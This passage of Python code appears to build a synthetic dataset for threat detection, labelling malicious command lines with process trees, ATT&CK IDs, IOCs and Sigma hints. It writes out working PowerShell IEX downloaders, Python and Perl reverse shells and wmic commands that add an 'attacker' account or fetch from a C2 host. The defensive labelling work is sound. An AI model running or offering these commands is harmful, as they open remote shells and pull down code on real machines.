    ]
    for i,(url,ip) in enumerate(ip_targets, 1):
        raw = f"powershell -EncodedCommand SQBFAFgA{'A'*20}"
        decoded = f"IEX((New-Object System.Net.WebClient).DownloadString('{url}'))"
        out.append(_rec(f"NIVX_PS_005_V{i}", "powershell", "windows", raw,
            f"EncodedCommand decodes to IEX downloader from {ip}.",
            _tree("windows",
                _n("powershell.exe", raw, "EncodedCommand IEX",
                   ["T1059.001","T1027","T1105"], "execution",
                   cite="-EncodedCommand",
                   children=[_n("(memory)", decoded, "In-memory stager",
                                ["T1059.001","T1105"], "execution",
                                cite=f"DownloadString('{url}')",
                                inferred=True, conf=0.7)]),
                f"EncodedCommand → IEX {ip}", "high",
                ["T1059.001","T1027","T1105"], ["execution","defense-evasion"],
                iocs={"urls":[url], "ips":[ip]},
                sigma=["Sigma: powershell -EncodedCommand + high entropy"],
                summary=f"Base64-encoded PowerShell fetching {ip} payload."),
            tags=["ps","encodedcommand","variant"], diff="medium"))

    # H) Python reverse shell (linux) IP variants
    py_ips = ["10.0.0.5:4444","192.168.1.7:9001","172.16.5.10:53",
              "10.10.10.10:8080","203.0.113.7:12345"]
    for i, target in enumerate(py_ips, 1):
        ip, port = target.split(":")
        raw = f"python -c \"import socket,os,pty;s=socket.socket();s.connect(('{ip}',{port}));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn('/bin/sh')\""
        out.append(_rec(f"NIVX_LNX_003_V{i}", "python", "linux", raw,
            f"Python reverse shell to {target}.",
            _tree("linux",
                _n("python", raw, "Python reverse-TCP shell",
                   ["T1059.006","T1095"], "command-and-control",
                   path="/usr/bin/python", cite=f"'{ip}',{port}",
                   children=[_n("sh","/bin/sh","pty-spawned shell",
                                ["T1059.004"], "execution", path="/bin/sh",
                                cite="pty.spawn('/bin/sh')", inferred=True, conf=0.75)]),
                f"Python reverse shell → {target}", "critical",
                ["T1059.006","T1095","T1059.004"], ["command-and-control","execution"],
                iocs={"ips":[ip]},
                sigma=["Sigma: python -c with socket + pty.spawn"],
                summary=f"One-liner Python reverse TCP shell to {target}."),
            tags=["linux","python","reverse-shell","variant"], diff="medium"))

    # J) Perl reverse shell variants
    perl_ips = ["10.0.0.5:4444","192.168.1.7:9001","172.16.5.10:53",
                "10.10.10.10:8080","203.0.113.7:12345","185.220.101.5:443"]
    for i, target in enumerate(perl_ips, 1):
        ip, port = target.split(":")
        raw = (f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,"
               "getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));"
               "exec(\"/bin/sh -i\")'")
        out.append(_rec(f"NIVX_LNX_007_V{i}", "bash", "linux", raw,
            f"Perl reverse shell → {target}.",
            _tree("linux",
                _n("perl", raw, "Perl reverse-TCP shell",
                   ["T1059.004","T1095"], "command-and-control",
                   path="/usr/bin/perl", cite=f"$i=\"{ip}\";$p={port}",
                   children=[_n("sh","/bin/sh -i","Interactive shell",
                                ["T1059.004"], "execution", path="/bin/sh",
                                cite="/bin/sh -i", inferred=True, conf=0.75)]),
                f"Perl reverse-TCP shell → {target}", "critical",
                ["T1059.004","T1095"], ["command-and-control","execution"],
                iocs={"ips":[ip]},
                sigma=["Sigma: perl one-liner with Socket + sockaddr_in"],
                summary=f"Perl reverse shell to {target} — common on legacy hosts."),
            tags=["linux","perl","reverse-shell","variant"], diff="medium"))

    # K) WMI wmic process create variants (windows)
    wmi_cmds = [
        ("cmd.exe /c calc.exe","calc.exe"),
        ("cmd.exe /c net user attacker P@ss /add","net user attacker"),
        ("powershell.exe -c IEX(New-Object Net.WebClient).DownloadString('http://c2/y')","IEX(New-Object Net.WebClient).DownloadString('http://c2/y')"),
        ("cmd.exe /c whoami > \\\\attacker\\share\\out.txt","\\\\attacker\\share"),
    ]
    for i,(cmd, cite) in enumerate(wmi_cmds, 1):
        raw = f"wmic process call create \"{cmd}\""
        out.append(_rec(f"NIVX_WMI_00{i}", "wmi", "windows", raw,
            f"WMIC process create → {cmd}.",
            _tree("windows",
                _n("wmic.exe", raw, "WMI process create",
                   ["T1047"], "execution",
                   path=r"C:\Windows\System32\wbem\wmic.exe", signer="Microsoft Windows",
                   lolbin=True, cite="wmic process call create",
                   children=[_n("wmiprvse.exe","","WMI provider host",
                                ["T1047"], "execution", inferred=True, conf=0.7,
                                cite="wmic process call create",
                                children=[_n("cmd.exe" if cmd.startswith("cmd") else "powershell.exe",
                                             cmd, "Spawned child",
                                             ["T1059.003" if cmd.startswith("cmd") else "T1059.001"],
                                             "execution", cite=cite)])]),
                f"WMIC lateral spawn → {cmd[:30]}", "high",
                ["T1047"], ["execution","lateral-movement"],
                iocs={},
                lolbins=["wmic.exe"],
                sigma=["Sigma: wmic process call create"],
                summary=f"WMI-based process launch used for lateral / privilege chain."),
            tags=["wmi","lateral","variant"], diff="hard"))

    return out


_ARCHES.extend(_variants())


# --- Public accessor ---------------------------------------------------- #
def all_archetypes() -> List[TrainingRecord]:
    return list(_ARCHES)


def categories() -> List[str]:
    return sorted({r.category for r in _ARCHES})


def platforms() -> List[str]:
    return sorted({r.platform for r in _ARCHES})


def stats() -> dict:
    from collections import Counter
    return {
        "total": len(_ARCHES),
        "by_platform": dict(Counter(r.platform for r in _ARCHES)),
        "by_category": dict(Counter(r.category for r in _ARCHES)),
        "by_difficulty": dict(Counter(r.difficulty for r in _ARCHES)),
    }
